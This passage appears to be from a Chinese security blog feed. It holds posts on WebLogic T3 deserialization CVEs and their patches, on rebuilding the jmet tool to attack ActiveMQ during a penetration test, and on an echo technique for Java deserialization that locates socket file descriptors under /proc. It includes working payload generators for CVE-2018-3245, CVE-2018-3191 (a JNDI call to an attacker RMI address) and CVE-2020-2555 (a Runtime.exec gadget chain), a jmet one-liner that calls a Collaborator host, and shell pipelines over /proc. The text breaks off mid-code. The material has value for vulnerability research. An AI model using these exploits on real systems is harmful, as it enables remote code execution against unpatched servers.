alt="image.png"></p><p>那UnicastRef又为啥逃过一劫？我们来看UnicastRef在序列化的时候经历了什么。在上面的payload中UnicastRef传入了RemoteObjectInvocationHandler，RemoteObjectInvocationHandler继承自RemoteObject。在RemoteObject writeObject时只是写入UnicastRef的类名（并没有把他作为一个类序列化）然后调用UnicastRef的writeExternal。<br><img src="1584860540228-fe6c0a00-c540-4adb-ba28-95f78f6c6526.png" alt="image.png"></p><p>UnicastRef又用到了LiveRef的write，写入了反序列化时需要反连的host和端口。<br><img src="1584860611067-35091a96-92e1-4880-af99-1a41df05c038.png" alt="image.png"></p><p><strong><img src="1584860770547-7e1eb9b8-1a60-46df-8176-0babe48b29ec.png" alt="image.png"></strong><br><strong>由此可见UnicastRef从始至终并没有作为一个类被反序列化</strong>，如果分析这个payload的resolve<em>时序会发现完全没有反序列化UnicastRef。<img src="1584757419567-e05e2bad-6864-4b2a-8808-ea680f0b396a.png" alt="image.png"><br>如果你分析序列化出来的数据会发现*</em>UnicastRef**只是TC_BLOCKDATA而不是TC_CLASSDESC。<br><img src="1584802424702-8c273e78-5144-4cf4-8508-9791166c0aeb.png" alt="image.png"></p><h2 id="CVE-2018-2893的修复"><a href="#CVE-2018-2893的修复" class="headerlink" title="CVE-2018-2893的修复"></a>CVE-2018-2893的修复</h2><p>补丁：18年7月 p27919965_1036_Generic<br>这次修复把经过resolveClass的java.rmi.server.RemoteObjectInvocationHandler给过滤了。<br><img src="1584757380169-c0e94533-c304-4b2b-92f4-5328df54978c.png" alt="image.png"></p><h2 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h2><p>再次引用@<strong><a href="https://xz.aliyun.com/u/4522">lpwd</a>师傅的话：</strong></p><blockquote><p>根据前面的分析可知，我们只需要找一个类似java.rmi.server.RemoteObjectInvocationHandler的类进行替换，就能继续绕过了。<br>那么这个类应该满足以下条件：<br>继承远程类：java.rmi.server.RemoteObject<br>不在黑名单里边（java.rmi.activation. 、sun.rmi.server.）<br>随便找了一下，符合条件的挺多的：<br>javax.management.remote.rmi.RMIConnectionImpl_Stub<br>com.sun.jndi.rmi.registry.ReferenceWrapper_Stub<br>javax.management.remote.rmi.RMIServerImpl_Stub<br>sun.rmi.registry.RegistryImpl_Stub<br>sun.rmi.transport.DGCImpl_Stub</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_3245</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">"192.168.1.3"</span>, <span class="number">8080</span>);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        ReferenceWrapper_Stub wrapperStub = <span class="keyword">new</span> ReferenceWrapper_Stub(ref);</span><br><span class="line">        ser(wrapperStub, <span class="string">"CVE_2018_3245.ser"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------序列化成功"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-3245的修复"><a href="#CVE-2018-3245的修复" class="headerlink" title="CVE-2018-3245的修复"></a>CVE-2018-3245的修复</h2><p>补丁：2018年8月 p28343311_1036_201808Generic<br>修复方法是添加更底层的java.rmi.server.RemoteObject。<br><img src="1584798148125-7379c092-e2f9-443f-8ad2-26abcf8c8c47.png" alt="image.png"></p><h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><p>这个洞是jndi注入。触发点在JtaTransactionManager。<br><img src="1584798618333-e4e39d89-ee25-4e2f-802a-ab5bf2599308.png" alt="image.png"></p><p><img src="1584798640381-5944e195-96af-4641-b0a9-cdf087c6a654.png" alt="image.png"></p><p><img src="1584798722915-cfb87146-35f9-438d-925c-41a52ae90838.png" alt="image.png"></p><p><img src="1584798761013-542d6fd5-8920-4078-9493-4b7c7c5f2741.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_3191</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String jndiAddress = <span class="string">"rmi://192.168.1.3:1099/Exploit"</span>;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(jndiAddress);</span><br><span class="line">        ser(jtaTransactionManager, <span class="string">"CVE_2018_3191.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------序列化成功"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-3191的修复"><a href="#CVE-2018-3191的修复" class="headerlink" title="CVE-2018-3191的修复"></a>CVE-2018-3191的修复</h2><p>补丁：2018年8月 p28343311_1036_Generic<br><img src="1584802019155-c6e68f15-42b1-460e-88ef-15ad5ae259dd.png" alt="image.png"></p><h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>Oracle Coherence组件存在漏洞，该组件默认集成在Weblogic12c及以上版本中（网上资料这么说的：web10.3.6也有只是默认没有启用，未验证）。<br>这个漏洞和cc5的构造有异曲同工之妙，触发点在BadAttributeValueExpException#readObject 中调用toString方法。<br><img src="1585031019146-eae01e8a-459f-4c4e-8721-5cf71ee4cf96.png" alt="image.png"><br>在Coherence组件中LimitFilter这个类刚好可以被序列化并且有toString这个方法。因为是反序列化，this.m_comparator和this.m_oAnchorBottom都可控。也就说<code>extractor.extract(``this``.m_oAnchorBottom)</code>完全可控(更严格的说m_comparator需要是ValueExtractor的实例并且和m_oAnchorBottom都需要可被序列化)。<br><img src="1585031243642-c510f34c-79ba-4281-ad7b-7369870e4812.png" alt="image.png"><br>我们来看一下有哪些满足条件的类实现了extract。<br>可以注意到com.tangosol.util.extractor.ReflectionExtractor#extract<br><img src="1585031717014-721c2395-5fe1-40ce-8d6d-6be6af1b0058.png" alt="image.png"><br>它可以被序列化并且extract里面是一组反射操作。<br><img src="1585031831736-9700a25a-4236-409c-a8c3-9c6314df0bc3.png" alt="image.png"></p><p><img src="1585031809085-a6f41e3e-8971-4416-8ec0-160d44a82f80.png" alt="image.png"><br>其次注意到com.tangosol.util.extractor.ChainedExtractor#extract<br><img src="1585031865174-55287322-bdeb-4ddf-843d-a31557b11098.png" alt="image.png"><br>里面是对extrator进行链式操作（并且这个类同样可以被反序列化），说到这里已经可以看出来是和cc链一个套路了。<br><img src="1585031899900-c0d8a1d2-e502-4829-9cf5-bda2bfc7d4c3.png" alt="image.png"></p><p>这里我是在windows上复现的（<del>很奇怪我在linux完整安装打不了，windows上默认安装就可以，</del>后来发现linux环境是7u21这个版本的BadAttributeValueExpException并没有readObject方法，另外不需要用完整示例安装默认安装即可）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.util.ValueExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_2555</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//String cmd = "touch /tmp/CVE_2020_2555_12013";</span></span><br><span class="line">        String cmd =<span class="string">"calc.exe"</span>;</span><br><span class="line">        ValueExtractor[] valueExtractors = <span class="keyword">new</span> ValueExtractor[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//new ReflectionExtractor("exec", new Object[]&#123;new String[]&#123;"/bin/bash", "-c", cmd&#125;&#125;)</span></span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// chain</span></span><br><span class="line">        LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, <span class="keyword">new</span> ChainedExtractor(valueExtractors));</span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Field val = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ser(expException, <span class="string">"./CVE_2020_2555_12013.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------序列化成功"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-2555的修复"><a href="#CVE-2020-2555的修复" class="headerlink" title="CVE-2020-2555的修复"></a>CVE-2020-2555的修复</h2><p>图片来自<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">ZDL</a>（侵删）可以看到是删了extractor.extract<br><img src="1585035027893-70b8222a-14ca-4001-84ce-471b16388b17.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>梳理完一遍之后，我们得以看到整个绕过思路的全貌。笔者主观分为三个阶段。</p><ul><li>第一阶段，CVE-2016-0638和CVE-2016-3510。利用反序列化流程中新new的原生ois绕过，只要找到了read*系列的点可以比较容易的看出来。</li><li>第二阶段，cve-2017-3248到cve-2018-3191。利用jrmp、jndi带外rce，漏洞点没有在read*的代码上下文中需要多跟几步有点“pop”的感觉了。</li><li>第三阶段，cve-2020-2555，需要对java的反序列化出现过知识点很熟悉（java原生类的触发点+weblogic组件中类似cc的套路），据说这个漏洞的作者也挖了很久。</li></ul><p><strong>碍于笔者水平，行文出错在所难免，如有阅读此文的师傅发现错误还请不吝指正。</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/162782">从WebLogic看反序列化漏洞的利用与防御</a><br><a href="https://www.jianshu.com/p/411e18ceaa55">Java 序列化之 Externalizable</a><br><a href="https://seaii-blog.com/index.php/2019/12/29/92.html">Weblogic漏洞调试笔记</a><br><a href="https://wooyun.js.org/drops/%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E5%BC%80%E6%94%BEHTTPS%E6%9C%8D%E5%8A%A1%E7%9A%84weblogic%E6%9C%8D%E5%8A%A1%E5%99%A8.html">如何控制开放HTTPS服务的weblogic服务器</a><br><a href="https://y4er.com/post/weblogic-cve-2016-0638/">Weblogic CVE-2016-0638 StreamMessageImpl反序列化绕过分析</a><br><a href="https://www.databaseusers.com/article/6108629/Patch+S8C2+is+mutually+exclusive+and+cannot+coexist+with+patch(es)%3A+ZLNA%2CEJUW">Patch S8C2 is mutually exclusive and cannot coexist with patch(es): ZLNA,EJUW</a><br><a href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a><br><a href="https://www.anquanke.com/post/id/152164">CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警</a><br><a href="https://nosec.org/home/detail/4314.html">漫谈 Weblogic CVE-2020-2555</a><br><a href="https://paper.seebug.org/1141/">Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</a></p>]]></content>
    
    <summary type="html">
    
      weblogic历史T3反序列化漏洞及补丁梳理
    
    </summary>
    
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>重新编译jmet小记</title>
    <link href="http://yoursite.com/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-03-21T11:46:24.000Z</published>
    <updated>2020-07-11T07:59:43.967Z</updated>
    
    <content type="html"><![CDATA[<!-- 在一次渗透测试过程中，发现内网有一些activemq版本很老官网的jmet打不了需要重新编译，踩了一些坑。 --><!-- more --><p>在一次渗透测试过程中，发现内网有一些activemq版本很老（2010年前的），但是并没有/fileserver这个路径意味着没法用<strong>CVE-2016-3088（猜测经过加固），</strong>不过幸运的是/admin没有授权就能访问意味着有主动触发CVE-2015-5254的可能性，猜测这种偏门的java洞可能被加固人员忽略，所以抄起<a href="https://github.com/matthiaskaiser/jmet">jmet</a>试了一下。回显如下<br><img src="1584789659269-eb4f1985-8c8f-4eae-88b5-cb4d8218eeb6.png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=1490&size=297008&status=done&style=none&width=745" alt="image.png"></p><p>看样子是失败了，经过一番谷歌过后看到github上有如下回答，猜测是因为activemq所依赖的包版本过老而jmet依赖的包比较新所以打不成功。<br><img src="1583215074318-58d2e7e5-d8c1-42a2-bf8d-cca000abff11.png#align=left&display=inline&height=125&name=image.png&originHeight=250&originWidth=2076&size=224257&status=done&style=none&width=1038" alt="image.png"><br><img src="1583215080926-c3b83bc4-a741-487e-aea7-014ae6e5c411.png#align=left&display=inline&height=139&name=image.png&originHeight=278&originWidth=1568&size=121245&status=done&style=none&width=784" alt="image.png"></p><p>正如github上这个老外所说需要加入legacy。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;activemq-openwire-legacy&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;5.15.11&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>既然问题问题出在依赖上就意味着要重新编译，踩了一些坑下面记录一下。</p><p>jmet可以攻击多种软件，有一些是商业的软件我们搞不到对应的jar，所以删除下面两个java。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.java</span><br><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java</span><br></pre></td></tr></table></figure><p>另外注意到jmet是依赖于ysoserial<br><img src="1584790845997-06ed872f-c5d6-4f4d-b6c4-a8ccc65de4d6.png#align=left&display=inline&height=201&name=image.png&originHeight=200&originWidth=742&size=25701&status=done&style=none&width=746" alt="image.png"></p><p>并且我们后续也会用到，奈何没找到什么中央仓库提供这种黑客依赖。无奈需要自己到导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=<span class="number">0.0</span><span class="number">.5</span>-SNAPSHOT -Dpackaging=jar -Dfile=</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export MAVEN_OPTS=-Xss10m</span><br><span class="line">mvn clean compile assembly:single</span><br></pre></td></tr></table></figure><p>然后就可以快乐的一键getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains java -jar jmet<span class="number">-0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"ping -n 1 wyyekrec31qzxtpc4kq636jbi2otci.burpcollaborator.net"</span> -Yp ROME  ip port</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      在一次渗透测试过程中，发现内网有一些activemq版本很老官网的jmet打不了需要重新编译，踩了一些坑。
    
    </summary>
    
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>linux下java反序列化通杀回显方法的低配版实现</title>
    <link href="http://yoursite.com/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-02-24T11:34:22.000Z</published>
    <updated>2020-07-11T08:03:22.977Z</updated>
    
    <content type="html"><![CDATA[<!-- 其实这个思路距离实现标配版的效果就一步之遥了～ --><!-- more --><p><a href="https://xz.aliyun.com/t/7307">首发于先知转载到自己博客</a></p><h2 id="故事的起因"><a href="#故事的起因" class="headerlink" title="故事的起因"></a>故事的起因</h2><p>一直觉得shiro反序列化是一个很舒服的洞，payload原生加密（无特征），实战中有概率遇见并且又是java反序列化洞所以危害又很大。不过尽管这样shiro打起来依然有java反序列化的两个痛点。第一是可用的gadget，第二个带内回显的问题。不过某天在刷tw的时候发现第二个痛点国内已经有大佬有成熟解决方案了。<br><img src="1582539071748-2900a239-4915-465f-9d8a-849a2a102b53.png#align=left&display=inline&height=728&name=image.png&originHeight=1160&originWidth=1188&size=1236427&status=done&style=none&width=746" alt="image.png"></p><p>注意看图，shiro的回显并不在http响应包中而是在http响应包之前，很玄学的回显对吧？联想最近在看了一篇文章<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台</a>，按我的理解这篇文章的思路大致是通过java反序列化执行代码&amp;&amp;系统命令获取到发起这次请求时服务端socket的文件描述符，然后在文件描述符写入回显内容。上图的回显效果和这种思路非常相似。</p><h2 id="技术的难点"><a href="#技术的难点" class="headerlink" title="技术的难点"></a>技术的难点</h2><p>实现这种技术的难点在于如何通过java反序列化执行代码&amp;&amp;系统命令获取本次http请求用到socket的文件描述符。因为在服务器对外开放的时会有fd下会有许多socket描述符。<br><img src="1582540730651-655c7e72-52c8-485d-b9f0-4cb038a724cb.png#align=left&display=inline&height=456&name=image.png&originHeight=690&originWidth=1130&size=173102&status=done&style=none&width=746" alt="image.png"><br>这里给出获取socket文件描述符我的一个低配版思路及实现，至于为啥是低配版会在文章最后提到。首先注意到socket后面的数字不同，这个数字实际上是inode号。这个inode号也出现在/proc/net/tcp中。<br><img src="1582540888379-0c087050-f90a-4881-8297-a465b7e28646.png#align=left&display=inline&height=135&name=image.png&originHeight=270&originWidth=2294&size=57686&status=done&style=none&width=1147" alt="image.png"><br>注意到每一个inode号对应唯一条tcp连接信息并且这条信息中的remote_address项记录了远程连接的ip和端口号。说到这里其实获取socket思路就很明显了：通过指定客户端发起请求的源端口号，通过cat grep awk组合大法在tcp表中拿到inode，把拿到的inode号再去fd目录下再用cat grep wak大法拿到文件描述符的数字，再调用java代码打开文件描述符即可实现带内回显。</p><h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><h3 id="指定端口号"><a href="#指定端口号" class="headerlink" title="指定端口号"></a>指定端口号</h3><p>requests库可以重新实现Http达到指定请求端口的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class SourcePortAdapter(HTTPAdapter):</span><br><span class="line">    <span class="string">""</span><span class="string">""</span>Transport adapter<span class="string">" that allows us to set the source port."</span><span class="string">""</span></span><br><span class="line">    <span class="function">def <span class="title">__init__</span><span class="params">(self, port, *args, **kwargs)</span>:</span></span><br><span class="line"><span class="function">        self._source_port </span>= port</span><br><span class="line">        <span class="keyword">super</span>(SourcePortAdapter, self).__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function">def <span class="title">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span></span><br><span class="line"><span class="function">        self.poolmanager </span>= PoolManager(</span><br><span class="line">            num_pools=connections, maxsize=maxsize,</span><br><span class="line">            block=block, source_address=(<span class="string">''</span>, self._source_port))</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(target, SourcePortAdapter(randNum))</span><br><span class="line">resp = s.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">5</span>, headers=headers, verify=False)</span><br></pre></td></tr></table></figure><h3 id="获取socket对应的文件描述符"><a href="#获取socket对应的文件描述符" class="headerlink" title="获取socket对应的文件描述符"></a>获取socket对应的文件描述符</h3><p>整个流程使用的命令如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=`cat /proc/$PPID/net/tcp6|awk <span class="string">'&#123;if($10&gt;0)print&#125;'</span>|grep -i %s|awk <span class="string">'&#123;print $10&#125;'</span>`;</span><br><span class="line">b=`ls -l /proc/$PPID/fd|grep $a|awk <span class="string">'&#123;print $9&#125;'</span>`;</span><br><span class="line">echo -n $b</span><br></pre></td></tr></table></figure><h3 id="往文件描述中写数据"><a href="#往文件描述中写数据" class="headerlink" title="往文件描述中写数据"></a>往文件描述中写数据</h3><p>现在假设shiro存在反序列化并且所用gadget的末端是走的TemplatesImpl，那么我们可以把ysoserial中的硬编码的命令执行改成下面这样的代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = &#123; <span class="string">"/bin/sh"</span>, <span 